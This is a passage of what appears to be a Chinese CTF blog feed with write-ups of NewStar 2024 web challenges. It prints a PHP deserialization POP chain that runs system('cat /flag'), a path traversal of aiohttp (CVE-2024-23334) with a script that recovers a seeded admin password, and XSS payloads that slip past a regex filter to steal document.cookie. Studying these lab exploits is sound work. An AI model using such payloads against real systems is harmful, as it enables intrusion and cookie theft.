class="hljs-variable">$runcode</span>=<span class="hljs-string">&quot;&lt;?php #&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;let_me.<span class="hljs-string">&quot;?&gt;&quot;</span>;<br>        <span class="hljs-variable">$tmpfile</span>=<span class="hljs-string">&quot;code.php&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$tmpfile</span>,<span class="hljs-variable">$runcode</span>);<br>            <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;we need more&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;time);<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$tmpfile</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;no!&quot;</span>;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;study ctf let me happy&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">happy</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sign_in</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;sign in &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;sign_in.<span class="hljs-string">&quot; here&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-variable">$signin</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;new_star[ctf&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$signin</span>) &#123;<br>    <span class="hljs-variable">$signin</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$signin</span>);<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$signin</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你是真正的CTF New Star 吗？ 让我看看你的能力&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>先讲一下野生wp的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span>=<span class="hljs-keyword">new</span> happy;<br><span class="hljs-variable">$exp</span>-&gt;sign_in=<span class="hljs-keyword">new</span> ctf;<br><span class="hljs-variable">$expp</span> = <span class="hljs-keyword">new</span> let_me;<br><span class="hljs-variable">$expp</span>-&gt;let_me = <span class="hljs-string">&quot;\nsystem(\$_GET[1]);&quot;</span>;<br><span class="hljs-variable">$expp</span>-&gt;time = <span class="hljs-keyword">new</span> study;<br><span class="hljs-variable">$exp</span>-&gt;sign_in-&gt;ctf=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$expp</span>,<span class="hljs-string">&#x27;get_flag&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br></code></pre></td></tr></table></figure><p>最后肯定是需要进到<code>getflag()</code>写文件进去执行rce,最后的代码里由于有<code>.</code>可以被当成语句触发调用<code>__tostring()</code>,然后利用数组调用<code>($this-&gt;ctf)(1);</code>这里有换行是为了过滤前面的内容，提前闭合。至于调用study我不太明白，问的ai说的是保持链的生命周期。</p><p>原理是在unlink之前触发catch异常防止删掉<code>code.php</code>,懂博主在说什么实操不怎么顺利。</p><p>学一下官p的思路</p><p>官p的关键点是<code> ($this-&gt;ctf)(1);</code>这里的ctf可以赋值为sleep，这样可以先执行睡眠1s再删除文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$payload</span>  = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">happy</span>();<br><span class="hljs-variable">$payload</span> -&gt;sign_in = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctf</span>();<br><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">let_me</span>();<br><span class="hljs-variable">$exp</span>-&gt;let_me=<span class="hljs-string">&quot;?&gt; &lt;?php system(&#x27;cat /flag&#x27;);&quot;</span>;<br><span class="hljs-variable">$exp</span>-&gt;time=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctf</span>();<br><span class="hljs-variable">$exp</span>-&gt;time-&gt;ctf=<span class="hljs-string">&quot;sleep&quot;</span>;<br><span class="hljs-variable">$payload</span> -&gt;sign_in-&gt;ctf = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$exp</span>,<span class="hljs-string">&quot;get_flag&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$payload</span>));<br></code></pre></td></tr></table></figure><p>由于类似于条件竞争，所以需要手速快一点或者用脚本。</p><h3 id="臭皮的网站复现"><a class="markdownIt-Anchor" href="#臭皮的网站复现"></a> 臭皮的网站(复现)</h3><p>源码给了提示</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">YWlvaHR0cD8gbmdpbng/IHJlYWRmaWxlPw==<br>aiohttp? nginx? readfile?<br></code></pre></td></tr></table></figure><p>网站是 aiohttp 框架，考察的是<code>CVE-2024-23334</code></p><p><img src="/../../images/Newstar/2024/57.png" alt="57"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs python">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br>Server: nginx/<span class="hljs-number">114.5</span><span class="hljs-number">.14</span><br>Content-<span class="hljs-type">Type</span>: text/x-python<br>Etag: <span class="hljs-string">&quot;17f68b1f9ac4ce00-fe6&quot;</span><br>Last-Modified: Thu, <span class="hljs-number">19</span> Sep <span class="hljs-number">2024</span> 04:<span class="hljs-number">34</span>:<span class="hljs-number">35</span> GMT<br>Content-Length: <span class="hljs-number">4070</span><br>Accept-Ranges: <span class="hljs-built_in">bytes</span><br>Date: Sun, <span class="hljs-number">10</span> Nov <span class="hljs-number">2024</span> <span class="hljs-number">13</span>:<span class="hljs-number">10</span>:<span class="hljs-number">38</span> GMT<br>Connection: close<br><br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> aiohttp <span class="hljs-keyword">import</span> web<br><span class="hljs-keyword">from</span> aiohttp_session <span class="hljs-keyword">import</span> setup <span class="hljs-keyword">as</span> session_setup, get_session<br><span class="hljs-keyword">from</span> aiohttp_session.cookie_storage <span class="hljs-keyword">import</span> EncryptedCookieStorage<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> secrets<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> base64<br>random.seed(uuid.getnode())<br><span class="hljs-comment"># pip install -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp_session cryptography</span><br><span class="hljs-comment"># pip install -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp==3.9.1</span><br><br><br>adminname = <span class="hljs-string">&quot;admin&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CreteKey</span>():<br>    key_bytes = secrets.token_bytes(<span class="hljs-number">32</span>)<br>    key_str = base64.urlsafe_b64encode(key_bytes).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>    <span class="hljs-keyword">return</span> key_str<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">authenticate</span>(<span class="hljs-params">username, password</span>):<br>    <span class="hljs-keyword">if</span> username == adminname <span class="hljs-keyword">and</span> password ==<span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="hljs-number">8</span>)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">app, handler</span>):<br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">middleware_handler</span>(<span class="hljs-params">request</span>):<br>        <span class="hljs-keyword">try</span>:<br>            response = <span class="hljs-keyword">await</span> handler(request)<br>            response.headers[<span class="hljs-string">&#x27;Server&#x27;</span>] = <span class="hljs-string">&#x27;nginx/114.5.14&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">except</span> web.HTTPNotFound:<br>            response = <span class="hljs-keyword">await</span> handler_404(request)<br>            response.headers[<span class="hljs-string">&#x27;Server&#x27;</span>] = <span class="hljs-string">&#x27;nginx/114.5.14&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">except</span> Exception:<br>            response = <span class="hljs-keyword">await</span> handler_500(request)<br>            response.headers[<span class="hljs-string">&#x27;Server&#x27;</span>] = <span class="hljs-string">&#x27;nginx/114.5.14&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br><br>    <span class="hljs-keyword">return</span> middleware_handler<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">handler_404</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> web.FileResponse(<span class="hljs-string">&#x27;./template/404.html&#x27;</span>, status=<span class="hljs-number">404</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">handler_500</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> web.FileResponse(<span class="hljs-string">&#x27;./template/500.html&#x27;</span>, status=<span class="hljs-number">500</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> web.FileResponse(<span class="hljs-string">&#x27;./template/index.html&#x27;</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">request</span>):<br>    data = <span class="hljs-keyword">await</span> request.post()<br>    username = data[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    password = data[<span class="hljs-string">&#x27;password&#x27;</span>]<br>    <span class="hljs-keyword">if</span> authenticate(username, password):<br>        session = <span class="hljs-keyword">await</span> get_session(request)<br>        session[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-string">&#x27;admin&#x27;</span><br>        response = web.HTTPFound(<span class="hljs-string">&#x27;/home&#x27;</span>)<br>        response.session = session<br>        <span class="hljs-keyword">return</span> response<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> web.Response(text=<span class="hljs-string">&quot;账号或密码错误哦&quot;</span>, status=<span class="hljs-number">200</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>(<span class="hljs-params">request</span>):<br>    session = <span class="hljs-keyword">await</span> get_session(request)<br>    user = session.get(<span class="hljs-string">&#x27;user&#x27;</span>)<br>    <span class="hljs-keyword">if</span> user == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> web.FileResponse(<span class="hljs-string">&#x27;./template/home.html&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> web.HTTPFound(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">request</span>):<br>    session = <span class="hljs-keyword">await</span> get_session(request)<br>    user = session.get(<span class="hljs-string">&#x27;user&#x27;</span>)<br>    <span class="hljs-keyword">if</span> user == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        reader = <span class="hljs-keyword">await</span> request.multipart()<br>        file = <span class="hljs-keyword">await</span> reader.<span class="hljs-built_in">next</span>()<br>        <span class="hljs-keyword">if</span> file:<br>            filename = <span class="hljs-string">&#x27;./static/&#x27;</span> + file.filename<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    chunk = <span class="hljs-keyword">await</span> file.read_chunk()<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> chunk:<br>                        <span class="hljs-keyword">break</span><br>                    f.write(chunk)<br>            <span class="hljs-keyword">return</span> web.HTTPFound(<span class="hljs-string">&quot;/list&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            response = web.HTTPFound(<span class="hljs-string">&#x27;/home&#x27;</span>)<br>            <span class="hljs-keyword">return</span> response<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> web.HTTPFound(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">ListFile</span>(<span class="hljs-params">request</span>):<br>    session = <span class="hljs-keyword">await</span> get_session(request)<br>    user = session.get(<span class="hljs-string">&#x27;user&#x27;</span>)<br>    command = <span class="hljs-string">&quot;ls ./static&quot;</span><br>    <span class="hljs-keyword">if</span> user == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        result = subprocess.run(command, shell=<span class="hljs-literal">True</span>, check=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>, capture_output=<span class="hljs-literal">True</span>)<br>        files_list = result.stdout<br>        <span class="hljs-keyword">return</span> web.Response(text=<span class="hljs-string">&quot;static目录下存在文件\n&quot;</span>+files_list)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> web.HTTPFound(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">init_app</span>():<br>    app = web.Application()<br>    app.router.add_static(<span class="hljs-string">&#x27;/static/&#x27;</span>, <span class="hljs-string">&#x27;./static&#x27;</span>, follow_symlinks=<span class="hljs-literal">True</span>)<br>    session_setup(app, EncryptedCookieStorage(secret_key=CreteKey()))<br>    app.middlewares.append(middleware)<br>    app.router.add_route(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, index)<br>    app.router.add_route(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, login)<br>    app.router.add_route(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;/home&#x27;</span>, home)<br>    app.router.add_route(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/upload&#x27;</span>, upload)<br>    app.router.add_route(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;/list&#x27;</span>, ListFile)<br>    <span class="hljs-keyword">return</span> app<br><br><br>web.run_app(init_app(), host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>这里 <code>admin</code> 密码使用了随机数，然而随机数的 <code>randseed</code> 设置如下，<code>random.seed(uuid.getnode())</code>.</p><p>这里种子是固定值，即 MAC 地址，可以通过文件读取获取这个种子。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/static/../../sys/class/net/eth0/address<br></code></pre></td></tr></table></figure><p>读取到mac地址</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">c6:7a:dd:01:e8:13#c67add01e813<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br>random.seed(<span class="hljs-number">0xc67add01e813</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="hljs-number">8</span>)))<br><span class="hljs-comment">#xPcTBtpn</span><br></code></pre></td></tr></table></figure><p>得到密码就可以正常登入了</p><p>定位一下上传文件的代码，简单分析进行以下操作</p><p><img src="/../../images/Newstar/2024/58.png" alt="58"></p><p><img src="/../../images/Newstar/2024/59.png" alt="59"></p><p>最后直接用开始的目录穿越就可以得到flag了</p><p><img src="/../../images/Newstar/2024/60.png" alt="60"></p><h3 id="pangbai-过家家5复现"><a class="markdownIt-Anchor" href="#pangbai-过家家5复现"></a> PangBai 过家家（5）(复现)</h3><p>在<code>bot.ts</code>里有内容</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">await</span> page.<span class="hljs-title function_">setCookie</span>(&#123;<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;FLAG&#x27;</span>,<br>        <span class="hljs-attr">value</span>: process.<span class="hljs-property">env</span>[<span class="hljs-string">&#x27;FLAG&#x27;</span>] || <span class="hljs-string">&#x27;flag&#123;test_flag&#125;&#x27;</span>,<br>        <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>        <span class="hljs-attr">domain</span>: <span class="hljs-string">&#x27;localhost:3000&#x27;</span>,<br>        <span class="hljs-attr">sameSite</span>: <span class="hljs-string">&#x27;Strict&#x27;</span><br>    &#125;);<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=# onerror=<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>);<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>可以绕过但是不出网</p><p>跟踪附件中的后端源码，<code>page.ts</code> 中的 <code>/box/:id</code> 路由，会渲染我们的输入</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ts">router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/box/:id&#x27;</span>, <span class="hljs-title function_">async</span> (ctx, next) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> letter = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">get</span>(ctx.<span class="hljs-property">params</span>[<span class="hljs-string">&#x27;id&#x27;</span>])<br>    <span class="hljs-keyword">await</span> ctx.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;letter&#x27;</span>, &lt;<span class="hljs-title class_">TmplProps</span>&gt;&#123;<br>        <span class="hljs-attr">page_title</span>: <span class="hljs-string">&#x27;PangBai 过家家 (5)&#x27;</span>,<br>        <span class="hljs-attr">sub_title</span>: <span class="hljs-string">&#x27;查看信件&#x27;</span>,<br>        <span class="hljs-attr">id</span>: ctx.<span class="hljs-property">params</span>[<span class="hljs-string">&#x27;id&#x27;</span>],<br>        <span class="hljs-attr">hint_text</span>: <span class="hljs-variable constant_">HINT_LETTERS</span>[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable constant_">HINT_LETTERS</span>.<span class="hljs-property">length</span>)],<br>        <span class="hljs-attr">data</span>: letter ? &#123;<br>            <span class="hljs-attr">title</span>: <span class="hljs-title function_">safe_html</span>(letter.<span class="hljs-property">title</span>),<br>            <span class="hljs-attr">content</span>: <span class="hljs-title function_">safe_html</span>(letter.<span class="hljs-property">content</span>)<br>        &#125; : &#123; <span class="hljs-attr">title</span>: <span class="hljs-variable constant_">TITLE_EMPTY</span>, <span class="hljs-attr">content</span>: <span class="hljs-variable constant_">CONTENT_EMPTY</span> &#125;,<br>        <span class="hljs-attr">error</span>: letter ? <span class="hljs-literal">null</span> : <span class="hljs-string">&#x27;找不到该信件&#x27;</span><br>    &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>但是输入的内容都经过了 <code>safe_html</code> 过滤</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">safe_html</span>(<span class="hljs-params"><span class="hljs-attr">str</span>: <span class="hljs-built_in">string</span></span>) &#123;<br>    <span class="hljs-keyword">return</span> str<br>        .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;.*&gt;/igm</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;\.*&gt;/igm</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;.*&gt;.*&lt;\/.*&gt;/igm</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>可见这只是一个正则替换，正则中各个标志的作用：</p><ul><li><p><code>i</code> 标志：忽略大小写</p></li><li><p><code>g</code> 标志：全局匹配，找到所有符合条件的内容</p></li><li><p><code>m</code> 标志：多行匹配，每次匹配时按行进行匹配，而不是对整个字符串进行匹配</p><p>由于 <code>m</code> 的存在，匹配开始为行首，匹配结束为行尾，因此我们只需要把 <code>&lt;</code> 和 <code>&gt;</code> 放在不同行即可</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script<br>&gt;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/send&#x27;</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>&#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<span class="hljs-string">&#x27;title&#x27;</span>: <span class="hljs-string">&quot;Cookie&quot;</span>, <span class="hljs-string">&#x27;content&#x27;</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&#125;)<br>&#125;)<br>&lt;/script<br>&gt;<br></code></pre></td></tr></table></figure><p>还看的一种野生的方法，记录一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=# onerror=<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/api/send&quot;</span>,&#123;<span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-attr">headers</span>:&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/json&#x27;</span>&#125;,<span class="hljs-attr">body</span>:<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<span class="hljs-string">&quot;title&quot;</span>:<span class="hljs-string">&quot;123123123&quot;</span>,<span class="hljs-string">&quot;content&quot;</span>:<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&#125;)&#125;);<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>大体是一致的思路，只是为了绕过xss的限制</p><h3 id="ez_redis复现"><a class="markdownIt-Anchor" href="#ez_redis复现"></a> ez_redis(复现)</h3><p>这题考察是cve，直接扔链接了，好累</p><p><a href="https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md">vulhub/redis/CVE-2022-0543/README.zh-cn.md at master · vulhub/vulhub (github.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024强网杯初赛</title>
    <link href="/2024/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AF/%E5%BC%BA%E7%BD%91%E6%9D%AF2024%E5%88%9D%E8%B5%9B/"/>
    <url>/2024/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AF/%E5%BC%BA%E7%BD%91%E6%9D%AF2024%E5%88%9D%E8%B5%9B/</url>
    
